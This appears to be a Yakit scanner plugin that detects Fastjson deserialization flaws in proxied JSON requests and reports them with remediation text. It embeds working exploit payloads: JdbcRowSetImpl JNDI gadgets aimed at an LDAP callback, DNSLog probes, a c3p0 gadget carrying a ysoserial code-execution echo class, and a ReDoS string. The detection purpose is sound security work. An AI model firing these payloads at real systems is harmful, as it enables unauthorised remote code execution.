// plug-in configuration
dnslogTimeout = 3
timeoutTolerance = 2 // 2 seconds timeout tolerance
fuzzTimeout = 10
networkFluctuation = 5 // Network fluctuation, fuzztimeout = networkFluctuation * getCommonWastTime()
log.setLevel("info")

encodePayload = payload=>{
    res = re.FindAll(payload, `"(.*?)"`)
    for i in res{
        payload = payload.Replace(i, `"%v"`%codec.UnicodeEncode(i[1:-1]))
    }
    return payload
}

logIsFastjsonInfo = b =>{
    info = "Unsupported fastjson flag"
    switch b{
        case 0:
            info = "Unable to determine the target json frame type"
        case 1:
            info = "target is suspected of using the fastjson framework."
        case -1:
            info = "The target is suspected to use the jaskon framework"
    }
    yakit.Info(info)
}

logVersionScope = scope =>{
    if len(scope) == 0{
        yakit.Info("Target json framework version detection failed")
        return
    }
    if scope[0] == scope[1]{
        yakit.Info("The target json framework version is [%s]" % scope[0])
    }else{
        yakit.Info("The target json framework version range is [ %s - %s]" % scope)
    }
}

versionCompare = (s1,s2)=>{ //. Version comparison only applies to version number comparisons like this: 1.1.1
    v1 = str.Split(s1,".")
    v2 = str.Split(s2,".")
    if len(v1) == 3 && len(v2) == 3{
        vc = (a,b)=>{return a > b ? 1 : (a == b ? 0 : -1)}
        for i in 3{
            vcr = vc(int(v1[i]),int(v2[i]))
            if vcr != 0{
                return vcr,true
            }
        }
    }else{
        return 0,false
    }
    return 0,true
}
versionInScope = (scope1,scope2)=>{ // Determine whether scope2 and scope1 Intersection
    if len(scope1) != 2 || len(scope2) != 2{
        return false
    }
    inScope = v=>{
        res,ok = versionCompare(scope1[0],v)
        if ok && res == 1{ // scope1[0] > v
            return false
        }
        res,ok = versionCompare(scope1[1],v)
        if ok && res == -1{ // scope1[1] < v
            return false
        }
        return true
    }
    return inScope(scope2[0]) || inScope(scope2[0])
}
solution = `1. Upgrade the Fastjson version: If Fastjson is used in your project, please make sure you are using version 1.2.80 or above. The Fastjson team has fixed the deserialization vulnerability and other security issues in version 1.2.80, so upgrading to a newer version is the best way to resolve the vulnerability.

2. Avoid using the AutoType feature: Fastjsons AutoType feature is an important factor leading to deserialization vulnerabilities. This feature can enhance deserialization capabilities to a certain extent, but it is also easily exploited by malicious actors. In actual use, try to avoid turning on the AutoType function. You can turn off this function by setting the autoTypeSupport attribute of ParserConfig to false. Doing so limits the ability to deserialize certain complex types, but improves security. The

3. Review input data: When processing JSON strings, data obtained from untrusted sources (such as the network, user input, etc.) should be fully validated and filtered. Ensure that only trusted data is passed to Fastjson for deserialization operations. `
description = `Fastjson deserialization vulnerability is A remote code execution vulnerability that allows an attacker to trigger the vulnerability by constructing a malicious JSON string and execute arbitrary code. The vulnerability exists because Fastjson does not properly check the deserialized data when processing certain JSON strings, allowing attackers to plant malicious code in JSON. `

// When json is empty,
isJson = d =>{
    try{
        return len(json.loads(d)) > 0
    }catch err{
        return false
    }
}
getBody = rsp =>{return str.SplitHTTPHeadersAndBodyFromPacket(rsp)[1] }
dnslogPocs = [`{"@type":"java.net.Inet4Address","val":"{{params(dnslog)}}"}`,`{"@type":"java.net.InetSocketAddress"{"address":,"val":"{{params(dnslog)}}"}`]

outNetExps = []

expMap = {
    "exp_1283":[`[{"@type": "java.lang.Exception","@type": "com.alibaba.fastjson.JSONException","x": {"@type": "java.net.InetSocketAddress"{"address":,"val": "{{params(dnslog1)}}"}}},{"@type": "java.lang.Exception","@type": "com.alibaba.fastjson.JSONException","message": {"@type": "java.net.InetSocketAddress"{"address":,"val": "{{params(dnslog2)}}"}}}]`],
    "exp_1243":[`{"{{randstr(2)}}":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"{{randstr(2)}}":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"{{params(reverseConnTarget)}}","autoCommit":true}}`,`{"@type":"[com.sun.rowset.JdbcRowSetImpl"[,,,{,,,"dataSourceName":"{{params(reverseConnTarget)}}", "autoCommit":true}`],
    "exp_1268":[`[{"@type": "java.lang.AutoCloseable","@type": "java.io.ByteArrayOutputStream"},{"@type": "java.io.ByteArrayOutputStream"},{"@type": "java.net.InetSocketAddress"{"address":,"val": "{{params(dnslog)}}"}}]`],
    "exp_c3p0":[`{"{{randstr(2)}}":{"@type":"java.lang.Class","val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"},"{{randstr(2)}}":{"@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:{{params(payload)}};"}}`]
}
poc_redos = `{"regex":{"$ref":"$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']"},"blue":"aaaaaaaaaaaaaaaaa!"}`
# mirrorNewWebsitePath Every time a new website path appears, the first request for this website path will be processed here. Incoming callback
mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
    originBody = body
    originReq = req
    originRsp = rsp
    freq = fuzz.HTTPRequest(req, fuzz.https(isHttps))~
    firstBody = body
    globalInfo = sync.NewMap()
    defer fn{
        e = recover()
        if e{
            yakit.Error("plugin run error: %v", e)
        }
        v,ok = globalInfo.Load("risk")
        if ok {
            v.createRisk()
        }
        yakit.Info("Fastjson comprehensive detection plug-in execution ends")
    }
    getCommonWastTime = ()=>{
        v,ok = globalInfo.Load("wastTimes")
        if !ok{
            return -1 // No timeout check is performed when obtaining commonTime fails
        }else{
            i = 0
            for t in v{
                i+=t
            }
            return i/len(v)
        }
    }
    newRisk = (title,payload,param,levelIndex)=>{
        yakit.Info("Vulnerability risk found: %v", title)
        log.debug("response: %v", string(param.rsp.ResponseRaw))
        globalInfo.Store("isFastjson",1)
        titleVerbose = title
        version,ok=globalInfo.Load("versionScope")
        if ok && (version[0] != "0.0.0" || version[1] != "999.999.999"){
            title += " version [%v-%v]"%version
        }
        v,ok=globalInfo.Load("risk")
        levelFlag = ["low","middle","critical"]
        rsp = param.rsp
        RequestRaw = rsp.RequestRaw
        ResponseRaw =rsp.ResponseRaw
        name = param.param.name
        if !ok || levelIndex >= v.level { // Update the risk when the risk level is greater than or equal to the previous risk
            globalInfo.Store("risk",{"level":levelIndex,"createRisk":()=>{
                risk.NewRisk(url,
                    risk.title(title),
                    // risk.titleVerbose(titleVerbose),
                    risk.parameter(name),
                    risk.level(levelFlag[levelIndex]),
                    risk.request(RequestRaw),
                    risk.response(ResponseRaw),
                    risk.payload(payload),
                    risk.description(description),
                    risk.solution(solution),
                    risk.details({"currentDuration":rsp.DurationMs/1000.0,"normalDurationS":getCommonWastTime(),"timeoutTolerance":timeoutTolerance})
                )
            }})
        }
    }
    isFastjson = (fuzzParam)=>{
        paramInfo = fuzzParam.param
        isFastjsonParam = 0
        if isJson(paramInfo.value){ // When the response packet is json, try to judge jackson by adding fields
            hasError = s =>{
                s = string(s)
                log.debug("detection Abnormal response: %v", s)
                return re.Match("false|500|error|(Internal Server Error)|(Unrecognized field)", s)
            }
            commonHasError = hasError(originBody)
            log.debug("Regular request body has error : %v",commonHasError)
            data = json.loads(paramInfo.value)
            data[randstr(5)] = randstr(5)
            dataStr = json.dumps(data)
            log.debug("Check jackson payload: %v", dataStr)
            rsp,err = fuzzParam.fuzz(dataStr)
            if err {
                yakit.Error("Send request error: %v", err)
                return
            }
            body = getBody(rsp.ResponseRaw)
            log.debug("Check jackson request body: %v",string(body))
            log.debug("Check jackson request body has error: %v",hasError(string(body)))
            // if !commonHasError && hasError(string(body)) || (string(body) != paramInfo.value) { // Due to added fields If it causes an error or is different from the original response packet content, it is judged to be jackson.
            if !commonHasError && hasError(string(body)) { // An error occurs due to adding fields or it is judged to be jackson
                isFastjsonParam = -1
            }
        }
        globalInfo.Store("isFastjson",isFastjsonParam)
        return isFastjsonParam
    }
    checkFastjsonVersion = param =>{
        scope = ["0.0.0","999.999.999"]
        rsp,err = param.fuzz(`{"@type":"java.lang.AutoCloseable"`)
        if err != nil{
            return nil
        }
        version = re.Grok(string(rsp.ResponseRaw), `fastjson-version %{COMMONVERSION:version}`)["version"]
        if version{
            if len(version) > 0{
                version = version[0]
                scope = [version,version]
                globalInfo.Store("isFastjson",1)
                newRisk("The target has a fastjson framework (Version Check)","",param,0)
            }
        }
        globalInfo.Store("versionScope",scope)
        return scope
    }
    hasCriticalRisk = ()=>{
        v,ok = globalInfo.Load("risk")
        if ok && v.level == 2{
            return true
        }
        return false
    }
    checkPayloadsByVersionScope = (param)=>{
        versionScope,ok = globalInfo.Load("versionScope")
        if len(versionScope) != 2{
            versionScope = ["0.0.0","999.999.999"]
        }
        if ok && versionScope !=nil && len(versionScope) == 2{
            exps = []
            v = "1.2.43"
            res,ok = versionCompare(versionScope[1],v)
            if ok {
                if res != 1{ // versionScope[1] <= v
                    varName = "exp_"+str.Join(str.Split(v,"."), "")
                    log.debug("Add payload: %v", varName)
                    exps.Append(expMap.$varName)
                }else{ // versionScope[1] > v
                    exps.Append(expMap.exp_1243)
                    exps.Append(expMap.exp_1268)
                    exps.Append(expMap.exp_1283)
                    log.debug("Add payload: exp_1243")
                    log.debug("Add payload: exp_1268")
                    log.debug("add payload: exp_1283")
                }
            }

            if len(exps)>0{
                checkDns = true
                domain,token,err = risk.NewDNSLogDomain()
                if err{ // If obtaining dnslog fails, try to use the wrong address to delay the test
                    yakit.Error("generates dnslog error: %v", err)
                    checkDns = false
                    domain = "123.123.123.123"
                }
                dnslog1Prefix = randstr(5)
                dnslog2Prefix = randstr(5)
                for exp in exps{
                    if checkDns{
                        exp = fuzz.StringsWithParam(exp,{"reverseConnTarget":"ldap://%v"%domain,"dnslog":domain,"dnslog1":"%s"%[domain],"dnslog2":"%s"%[domain]})
                    }else{
                        exp = fuzz.StringsWithParam(exp,{"reverseConnTarget":"ldap://%v"%domain,"dnslog":domain,"dnslog1":"%v.%s"%[dnslog1Prefix,domain],"dnslog2":"%v.%s"%[dnslog2Prefix,domain]})
                    }
                    if len(exp) == 0{
                        continue
                    }
                    exp = exp[0]
                    rsp,err = param.delayFuzz(exp)
                    wastTime = rsp.DurationMs/1000.0
                    if checkDns{
                        res,err = risk.CheckDNSLogByToken(token,dnslogTimeout)
                        if err{
                            // dnslog query failure
                        }else{
                            if len(res) > 0{ // dnslog query detection is successful
                                globalInfo.Store("outNet",1)
                                for info in res{
                                    if str.HasPrefix(str.ToLower(info["Domain"]),str.ToLower(dnslog1Prefix)){
                                        globalInfo.Store("versionScope",["1.2.80","1.2.80"])
                                    }
                                    if str.HasPrefix(str.ToLower(info["Domain"]),str.ToLower(dnslog2Prefix)){
                                        globalInfo.Store("versionScope",["1.2.83","1.2.83"])
                                    }
                                }
                                newRisk("The target fastjson framework may have an RCE vulnerability (DNSLog Check)",exp,param,2)
                                break
                            }
                        }
                    }
                    log.debug("Current request duration: %v", wastTime)
                    log.debug("regular request duration: %v", getCommonWastTime())
                    log.debug("Current timeout tolerance value: %v", timeoutTolerance)
                    if wastTime - getCommonWastTime() > timeoutTolerance{ // If dnslog query fails, delay detection will be performed
                        newRisk("The target fastjson framework may have an RCE vulnerability (Delay Check)",exp,param,2)
                        break
                    }
                }
            }
        }
    }

    needToFuzzParams = [] // (payload) => freq
    reqIsJson = str.MatchAllOfRegexp(string(req), `(?i)Content-Type: (.*?)json`)
    rspIsJson = str.MatchAllOfRegexp(string(rsp), `(?i)Content-Type: (.*?)json`)
    if reqIsJson{
        log.debug("Request package body exists in json")
    }
    if rspIsJson{
        log.debug("response package body exists json")
    }
    if !reqIsJson && !rspIsJson { // . If the Content-Type of the request packet or response packet does not contain json, check the json in queryParam, cookieParam, and postParam.
        allParams = freq.GetPostParams()
        allParams.Append(freq.GetGetQueryParams()...)
        allParams.Append(freq.GetCookieParams()...)
        for param in allParams{
            p = param
            value = p.Value()
            log.debug("Check whether the parameter `%v:%v` is json", p.Name(),value)
            if typeof(value).String() == "[]string"{ // handles the array parameters.
                if len(value) > 0{
                    value = value[0]
                }else{
                    continue
                }
            }
            if isJson(value){
                log.debug("Found the json parameter `%v:%v` located in %v", p.Position(),p.Name(),value)
                needToFuzzParams.Append({"value":value,"fuzz":(payload)=>{
                    return p.Fuzz(payload)
                },"name":p.name(),"rsp":originRsp})
            }
        }
    }else{ // fuzz body
        if reqIsJson{
            body = getBody(rsp)
            res = {"value":string(body),"fuzz":(payload)=>{
                return freq.FuzzPostRaw(payload)
            },"name":"[body]","isBody":true}
            needToFuzzParams.Append(res)
        }
    }
    for i = 0; i < len(needToFuzzParams); i++{
        param = needToFuzzParams[i]
        newParam = {"param":param,"isBody":param["isBody"]}
        delayFuzz = payload=>{
            payload = encodePayload(payload)
            rsp,err = param.fuzz(payload).ExecFirst(fuzz.WithTimeOut(fuzzTimeout))
            if err == nil{
                if str.Contains(string(rsp.ResponseRaw),"autoType is not support"){
                    globalInfo.Store("isFastjson",1)
                }
            }
            newParam["rsp"] = rsp
            return rsp,err
        }
        newParam["delayFuzz"] = delayFuzz
        newParam["fuzz"] = payload=>{ // Each regular request will be included in the average Request duration
            rsp,err = delayFuzz(payload)
            wastTime = rsp.DurationMs/1000.0
            v,ok = globalInfo.Load("wastTimes")
            commonWastTime = getCommonWastTime()
            if commonWastTime != -1{ // adjusts network fluctuations, and the timeout length can be calculated based on network fluctuations
                wastTimeRound = math.Round(wastTime) // in seconds, reduce the error
                commonWastTimeRound = math.Round(commonWastTime)
                if !(wastTimeRound == 0 || commonWastTimeRound == 0){ // It is necessary to adjust if it exceeds 1 second.
                    networkFluctuation_bak = networkFluctuation
                    tt = len(v)/10.0 // adjustment coefficient, the more statistics, the greater the coefficient, the maximum is 1
                    if tt > 1{
                        tt = 1
                    }
                    fluctuation = math.Abs(wastTimeRound-commonWastTimeRound)*1.0/commonWastTimeRound
                    fluctuation = math.Ceil(fluctuation)
                    networkFluctuation = networkFluctuation - (networkFluctuation - fluctuation)*tt // Each adjustment range must be multiplied by the adjustment coefficient
                    log.debug("Adjust network fluctuations : `%f` -> `%f`" %[networkFluctuation_bak,networkFluctuation])
                }
            }
            if !ok{
                v = [wastTime]
            }else{
                v = append(v,wastTime)
            }
            if getCommonWastTime() != -1{
                fuzzTimeout = math.Ceil(getCommonWastTime()) * networkFluctuation // Adjust the timeout according to network fluctuations
            }
            globalInfo.Store("wastTimes",v)
            return rsp,err
        }
        needToFuzzParams[i] = newParam
    }

    if len(needToFuzzParams) == 0{
        return
    }
    fuzzParam = needToFuzzParams[0]

    // Error detection
    fastjsonCheck = isFastjson(fuzzParam)
    logIsFastjsonInfo(fastjsonCheck)
    if fastjsonCheck != -1{ // . If it is not the jackson framework, continue to detect
        log.debug("The target uses a non-jackson framework")
        versionScope = checkFastjsonVersion(fuzzParam)
        logVersionScope(versionScope)
        log.debug("Start EXP to detect")
        for param in needToFuzzParams{
            checkPayloadsByVersionScope(param) // depends on the version fuzz
            if hasCriticalRisk(){
                break
            }
        }
        // The previous step can already know the outgoing network information and regular request duration information
        // Reverse connection detection (this step can obtain a more accurate outgoing network situation)
        v, ok = globalInfo.Load("isFastjson")
        if (!ok || ok && v!=-1) && !hasCriticalRisk(){
            log.debug("Start outgoing network detection")
            for param in needToFuzzParams{
                for poc in dnslogPocs{
                    checkDns = true
                    domain,token,err = risk.NewDNSLogDomain()
                    if err{ // If obtaining dnslog fails, try to use the wrong address to delay the test
                        yakit.Error("generates dnslog error: %v", err)
                        checkDns = false
                        domain = x"{{randstr}}.{{randstr}}.com"
                    }
                    poc = fuzz.StringsWithParam(poc, {"dnslog":domain})
                    if len(poc) != 1{
                        continue
                    }
                    poc = poc[0]
                    rsp,err = param.delayFuzz(poc)
                    if checkDns{
                        res,err = risk.CheckDNSLogByToken(token, dnslogTimeout)
                        die(err)
                        if len(res)>0{
                            globalInfo.Store("outNet",1)
                            newRisk("Target fastjson framework exists dnslog echo",poc,param,0)
                            break
                        }
                    }
                    wastTime = rsp.DurationMs/1000.0
                    if wastTime - getCommonWastTime() > timeoutTolerance{ // If dnslog query fails, delay detection will be performed
                        newRisk("The target fastjson framework may have a vulnerability (Delay Check)",poc,param,0)
                        break
                    }
                }
            }
        }

        /*
            will be misjudged. The next non-outline detection requires blasting the exploit chain, which has a lot of payloads. Here we will discuss it again. Confirm that the target is fastjson. If it cannot be confirmed, end the detection of
        */
        // fastjson feature detection (dos delay, file reading, etc.)
        if !hasCriticalRisk() && globalInfo.Load("isFastjson")[0] != 1{
            log.debug("Start fastjson feature detection")
            // redos detection is applicable to 1.2.36 - 1.2.62
            scope,ok = globalInfo.Load("versionScope")
            if ok && versionInScope(scope,["1.2.36","1.2.6"]) {
                log.debug("redos feature detection")
                for param in needToFuzzParams{
                    fuzzOk = true
                    for in 3{
                        rsp,err = param.delayFuzz(poc_redos)
                        if rsp.DurationMs/1000.0 - getCommonWastTime() <= timeoutTolerance {
                            fuzzOk = false
                            break
                        }else{
                            log.info(". Discover redos vulnerability")
                        }
                    }
                    if fuzzOk {
                        newRisk("target exists fastjson framework (Redos Check)","",param,0)
                        break
                    }
                }
            }
        }

        // does not go out of the network detection (there will be more packets here, you need to ensure that the target is fastjson)
        v,ok = globalInfo.Load("outNet")
        isFastjson,ok = globalInfo.Load("isFastjson")
        if (!ok || ok && v != 1) && !hasCriticalRisk() && isFastjson == 1 {
            log.debug("Start echo detection")
            key = randstr(5)
            val = randstr(5)
            gadgets = yso.GetAllTemplatesGadget()
            for gadgetGen in gadgets{
                gadget,err = gadgetGen(yso.useHeaderEchoEvilClass(),yso.springHeader(key,val))
                if err{
                    yakit.Error("generates header echo payload error: %v", err)
                }
                byts = yso.ToBytes(gadget)~
                payload = codec.EncodeToHex(byts)~
                payload = str.ToUpper(payload)
                payload = fuzz.StringsWithParam(expMap.exp_c3p0, {"payload":payload})
                if len(payload) > 0{
                    payload = payload[0]
                }
                for param in needToFuzzParams{
                    if param["isBody"] != true{
                        continue
                    }
                    originReq = poc.DeleteHTTPPacketHeader(originReq, "Accept-Language")
                    req = poc.AppendHTTPPacketHeader(originReq, "Accept-Language","zh-CN,zh;q=1.9")
                    freq,err = fuzz.HTTPRequest(req, fuzz.https(isHttps))
                    if err != nil{
                        yakit.Error("Generate fuzz request error: %v", err)
                    }
                    rsp,err = freq.FuzzPostRaw(payload).ExecFirst()
                    if err != nil{
                        continue
                    }
                    if poc.GetHTTPPacketHeader(rsp.ResponseRaw, key) == val{
                        newRisk("Target fastjson framework There is an RCE vulnerability, and the echo code is successfully executed.",payload,param,2)
                    }
                }
            }
        }
    }
}

